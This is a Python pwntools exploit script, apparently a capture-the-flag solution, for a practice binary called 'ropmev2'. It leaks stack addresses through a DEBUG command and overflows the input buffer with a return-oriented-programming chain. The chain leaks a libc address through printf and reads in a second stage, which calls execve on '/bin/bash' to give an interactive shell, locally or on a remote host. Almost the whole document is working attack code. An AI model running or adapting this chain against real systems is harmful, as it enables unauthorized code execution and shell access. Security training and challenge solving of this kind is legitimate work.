#!/usr/bin/python3
from pwn import *
import sys

if len(sys.argv) > 1:

    if sys.argv[1] == '--debug':
        p = gdb.debug("./ropmev2")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif sys.argv[1] == '--remote':
        host = sys.argv[2]
        port = int(sys.argv[3])
        p = connect(host, port)
        libc = ELF("./libc.so.6")
    else:
        print("See file for usage")
        quit()
else:
    p = process("./ropmev2")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


elf = ELF("./ropmev2")

gadgets = ROP(elf)

PRINTF = elf.plt['printf']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (gadgets.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (gadgets.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
POP_RDX = (gadgets.find_gadget(['pop rdx', 'pop r13', 'ret']))[0]
NULL    = 0x0000000000000000  # Used to disable the mangler
RBP_MASK = 0xdeadbeef00ded00d
DUMMY = 0xdeadbeeffeedf4ce
FORMAT_MOD = b"%s\n\0\0\0\0\0" # qword aligned
READ = elf.symbols['read']

log.info("=== Binary info ===")
log.info('plt@printf               :' + hex(PRINTF))
log.info('pop rdi gadget           :' + hex(POP_RDI))
log.info('pop rsi gadget           :' + hex(POP_RSI))
log.info('pop rdx gadget           :' + hex(POP_RDX))
log.info('rbp mask                 :' + hex(RBP_MASK))
log.info("pop rXX dummy            :" + hex(DUMMY))

''' 
Stage one, get the location of the next input buffer based on the difference 
between two DEBUG calls
'''
log.info("Stage 1, get the address of the input buffers and calculate difference")
p.sendlineafter('me', "DEBUG")
p.recvline()
result = p.recvline()
addr = result.strip(b"\n")[-14:]
addr_1  = int(addr, 16)
log.info("Addr input buffer 1 : %s" % hex(addr_1))

p.sendlineafter('me', "DEBUG")
p.recvline()
result = p.recvline()
addr = result.strip(b"\n")[-14:]
addr_2  = int(addr, 16)
log.info("Addr input buffer 2 : %s" % hex(addr_2))

offset = addr_1 - addr_2
log.info("Input buffer offset : %s(%s)" % (hex(offset), offset))

'''
Stage 2, leak the vadd of __libc_start_main. In order to do so,
we need to drop out of main() and enter the ROP chain.
When this chain ends, the program will crash, because there is no valid return address
Normally, we would return to main() but somehow, this symbol does not exist.

But we do have access to the read function in the plt. We can use it to read
new instructions to the end of the stack ..

Later 

'''

# Calculate the address of the format modifier in our payload
ADDR_FORMAT_MOD = addr_2 - offset + 248
DEST_BUF = addr_2 - offset + 336
BUFSIZE = 200 

payload = Buffer()
payload.add(p64(NULL)) # 8  This qword disables the mangler of destroying our payload
payload.add(cyclic(200)) # 208 This completes the padding. From now on, we are overwriting the stackframe and return pointer
payload.add(p64(RBP_MASK)) # 216
payload.add(p64(POP_RDI))     #  224
payload.add(p64(ADDR_FORMAT_MOD))  # 232
payload.add(p64(POP_RSI)) # 240
payload.add(p64(LIBC_START_MAIN)) # 248
payload.add(FORMAT_MOD) # 256  This gets popped into r15, but we'll still need it
payload.add(p64(PRINTF)) # 264
payload.add(p64(POP_RDI)) # 272 Setup the read instruction
payload.add(p64(NULL)) # 280 First param to read() STDIN
payload.add(p64(POP_RSI)) # 388
payload.add(p64(DEST_BUF)) # 396  The location of our buffer
payload.add(p64(DUMMY)) #304 To fill r15
payload.add(p64(POP_RDX)) # 312  Amount of bytes to read
payload.add(p64(BUFSIZE)) # 320 100 bytes
payload.add(p64(DUMMY)) # 328 Dummy data that gets popped into r13
payload.add(p64(READ)) # 336 Execute the read
#------ Here is where we want to read more instructions to -----

log.info('Addr format mod : %s'  % hex(ADDR_FORMAT_MOD))
log.info('Stage 2, Obtain address of __libc_start_main')

p.sendlineafter("me", payload.get())
p.recvline()
result = p.recvline()

addr_libc_main_start = result.strip(b"\n")  # Grep the chunk we need
addr_libc_main_start = u64(addr_libc_main_start.ljust(8, b"\x00"))
log.info("Location of __libc_start_main : " + hex(addr_libc_main_start))

'''
Stage 3, craft a payload to execute a shell
Ok, so the server won't let us execute /bin/sh as it says LOL NOPE.
Let's try to supply a string with for instance /bin/bash
'''

libc.address = addr_libc_main_start - libc.symbols['__libc_start_main']
EXECVE = libc.sym['execve']
BIN_SH = b"/bin/bash".ljust(16, b"\x00")
ADDR_BIN_SH = addr_2 - offset + 408
PTR_ADDR_BIN_SH = addr_2 - offset + 424


log.info("Stage 3: Execute shell")

log.info("Libc start address : " + hex(libc.address))
log.info("execve addr        : " + hex(EXECVE))
log.info("BIN_SH addr        : " + hex(ADDR_BIN_SH))
log.info("PTR_ADD_BIN_SH     : " + hex(PTR_ADDR_BIN_SH))

payload = Buffer()
payload.add(p64(POP_RDI)) # 344
payload.add(p64(ADDR_BIN_SH)) # 352  This is where the string is located, at the end of this payload
payload.add(p64(POP_RSI)) # 360
payload.add(p64(PTR_ADDR_BIN_SH)) # 368  This one points to the pointers, pointing to the string. It's put at the end, as it needs to be null terminated
payload.add(p64(DUMMY)) # 376
payload.add(p64(POP_RDX)) # 384
payload.add(p64(NULL)) # 392
payload.add(p64(DUMMY)) # 400
payload.add(p64(EXECVE)) # 408
payload.add(BIN_SH) # 424  Double Q word
payload.add(p64(ADDR_BIN_SH)) # 432
payload.add(p64(NULL)) # 440

p.send(payload.get())

p.interactive()




